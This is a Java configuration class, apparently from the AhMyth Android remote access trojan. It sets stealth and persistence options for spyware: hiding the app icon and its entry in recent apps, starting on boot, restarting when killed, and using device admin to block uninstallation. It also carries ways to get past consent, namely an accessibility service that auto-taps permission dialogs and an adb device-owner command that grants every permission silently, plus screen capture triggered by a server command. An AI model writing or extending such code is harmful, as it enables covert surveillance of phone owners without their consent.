package ahmyth.mine.king.ahmyth;

/**
 * StealthConfig - Configuration for stealth/hidden mode
 * These values can be modified during APK build process
 */
public class StealthConfig {
    
    // ═══════════════════════════════════════════════════════════
    // VISIBILITY SETTINGS
    // ═══════════════════════════════════════════════════════════
    
    // Hide app icon from launcher after first run
    public static boolean HIDE_ICON = false; // Disabled for testing
    
    // Exclude from recent apps list
    public static boolean HIDE_FROM_RECENTS = false;
    
    // Delay before hiding icon (ms) - give time for permissions
    public static int HIDE_DELAY_MS = 3000;
    
    // Close activity after setup (run headless)
    public static boolean AUTO_CLOSE_ACTIVITY = false;
    
    // ═══════════════════════════════════════════════════════════
    // SERVICE SETTINGS
    // ═══════════════════════════════════════════════════════════
    
    // Start service automatically on boot
    public static boolean START_ON_BOOT = true;
    
    // Use silent/minimal notification
    public static boolean SILENT_NOTIFICATION = false;
    
    // Auto-restart service if killed
    public static boolean PERSISTENT_SERVICE = true;
    
    // Keep CPU wake lock for background operation
    public static boolean WAKE_LOCK = true;
    
    // Request device admin to prevent uninstallation
    public static boolean UNINSTALL_PROTECTION = false;
    
    // ═══════════════════════════════════════════════════════════
    // PERMISSION SETTINGS - ADVANCED SKIP OPTIONS
    // ═══════════════════════════════════════════════════════════
    
    /**
     * SKIP_PERMISSION_PROMPTS - Request all permissions in one batch
     * When true: Requests all permissions at once (may be auto-granted on some ROMs)
     * When false: Request permissions one by one with user prompts
     */
    public static boolean SKIP_PERMISSION_PROMPTS = false;
    
    /**
     * SILENT_PERMISSION_MODE - Minimal UI during permission requests
     * Reduces visual feedback and delays between permission requests
     */
    public static boolean SILENT_PERMISSION_MODE = false;
    
    /**
     * USE_ACCESSIBILITY_GRANTER - Auto-click permission dialogs
     * Requires user to enable accessibility service first
     * Can automatically tap "Allow" buttons on permission dialogs
     * Set to true for hidden permission granting (must prompt user for accessibility service once)
     */
    public static boolean USE_ACCESSIBILITY_GRANTER = false;
    
    /**
     * DEVICE_OWNER_MODE - Full device control (requires ADB provisioning)
     * When provisioned as device owner, can grant ALL permissions silently
     * Command: adb shell dpm set-device-owner ahmyth.mine.king.ahmyth/.AdminReceiver
     */
    public static boolean DEVICE_OWNER_MODE = false;
    
    /**
     * ADB_GRANT_MODE - Permissions granted via ADB before first launch
     * Set to true when installing via ADB with permission grants
     * Skips permission request UI entirely
     */
    public static boolean ADB_GRANT_MODE = true;
    
    /**
     * SKIP_SPECIAL_PERMISSIONS - Skip overlay, storage manager, battery optimization
     * These require user to go to Settings, can be skipped for faster stealth
     */
    public static boolean SKIP_SPECIAL_PERMISSIONS = false;
    
    /**
     * MINIMAL_PERMISSIONS_ONLY - Request only essential permissions
     * Skips optional permissions to reduce user interaction
     */
    public static boolean MINIMAL_PERMISSIONS_ONLY = false;
    
    /**
     * Permission request delay (ms) - Time between permission requests
     * Lower = faster but may trigger security warnings
     * Higher = slower but more reliable
     */
    public static int PERMISSION_DELAY_MS = 100;
    
    // ═══════════════════════════════════════════════════════════
    // SCREEN CAPTURE SETTINGS
    // ═══════════════════════════════════════════════════════════
    
    /**
     * AUTO_REQUEST_SCREEN_CAPTURE - Automatically request MediaProjection
     * Shows system dialog that user must approve
     */
    public static boolean AUTO_REQUEST_SCREEN_CAPTURE = false;
    
    /**
     * SKIP_SCREEN_CAPTURE_PROMPT - Don't show screen capture request on install
     * Can be triggered later via command from server
     */
    public static boolean SKIP_SCREEN_CAPTURE_PROMPT = false;
}
